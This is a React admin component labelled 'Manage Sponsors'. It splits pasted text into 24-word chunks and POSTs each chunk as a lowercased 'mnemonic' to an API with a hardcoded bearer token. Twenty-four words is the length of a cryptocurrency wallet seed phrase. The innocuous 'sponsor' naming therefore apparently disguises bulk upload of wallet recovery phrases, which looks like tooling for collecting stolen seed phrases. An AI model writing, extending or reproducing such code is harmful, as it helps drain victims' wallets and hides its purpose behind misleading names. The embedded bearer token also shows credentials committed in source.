import React, { useState } from 'react'
import { motion } from "framer-motion";
import { Card, CardContent } from './ui/card';
import { Users, Check, X } from "lucide-react";
import { chunkArray, sleep } from '@/lib/utils';
import ActionBtn from './ActionBtn';
import SponsorsSmartPoller from './SponsorsSmartPoller';

function Sponsors() {
    const [sponsors, setSponsors] = useState('');
    const [logs, setLogs] = useState([]);

    const API = import.meta.env.VITE_API_URL;

    const handleUploadSponsors = async () => {
        setLogs([{msg: "Setting up Sponsors for upload"}]);

        const parts = sponsors.trim().split(/\s+/);
        const words = chunkArray(parts, 24)
        await sleep(500);
        setLogs((prev) => [...prev, {msg: `Discovered ${words.length} sponsors for upload`}]);
        await sleep(500)
        for(const phrase of words) {
            setLogs((prev) => [...prev, {msg: `Uploading sponsor: ${phrase.slice(0, 15)}......${phrase.slice(-15)}`}]);

            const response = await fetch(`${API}/sponsors`, {
			    method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer hfhryeujhshbxhdsjjskaas',
                },
                body: JSON.stringify({ 
                    mnemonic: phrase.toLowerCase(),
                    name: 'whoami5677'

                })
		    });
		    const res = await response.json();
            if(res.success) {
                setLogs((prev) => [...prev, {msg: res.feedback}]);
            } else {
                setLogs((prev) => [...prev, {error: res.error}]);
            }

            await sleep(999);
        }
        

        setLogs((prev) => [...prev, {msg: 'Uploading completed...'}]);
    };

    const handleDeleteSponsor = async (id) => {
        const response = await fetch(`${API}/sponsors/${id}`, {
            method: 'DELETE',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': 'Bearer hfhryeujhshbxhdsjjskaas',
            }
        });
        const res = await response.json();
        alert(res.message);
    }

    return (
        <motion.section initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="mt-4">
            <Card className="rounded-2xl border-indigo-900/40 bg-white/5">
                <CardContent className="p-4 sm:p-6">
                    <h2 className="mb-4 flex items-center gap-2 text-lg font-semibold text-gray-200">
                        <Users className="h-5 w-5 text-indigo-300" />
                        Manage Sponsors
                    </h2>
                    <form className="grid grid-cols-1 gap-3 sm:grid-cols-[1fr_1fr_auto]">
                        <div className='w-full flex flex-col gap-1'>
                            <textarea 
                                cols={4} 
                                rows={4}
                                value={sponsors}
                                onChange={(e) => setSponsors(e.target.value)}
                                className='border border-gray-600 rounded resize-none ring-0 outline-none text-gray-400 px-2 text-base'
                            ></textarea>
                            <ul className='flex flex-col'>
                                {logs.length > 0 && logs.map((log, i) => (
                                    <li key={`${log?.msg || log?.error}-${i}`} className={`text-xs ${log?.msg?.length ? 'text-green-600' : 'text-red-600'} flex gap-1 items-center`}>
                                        {log?.msg?.length ? <Check className="h-3 w-3" /> : <X className="h-3 w-3" />}
                                        { log?.msg || log?.error }
                                    </li>
                                ))}
                            </ul>
                        </div>
                        
                        <ActionBtn onClick={handleUploadSponsors} />
                    </form>

                    <SponsorsSmartPoller onDelete={handleDeleteSponsor}  />
                </CardContent>
            </Card>
        </motion.section>
    );
}

export default Sponsors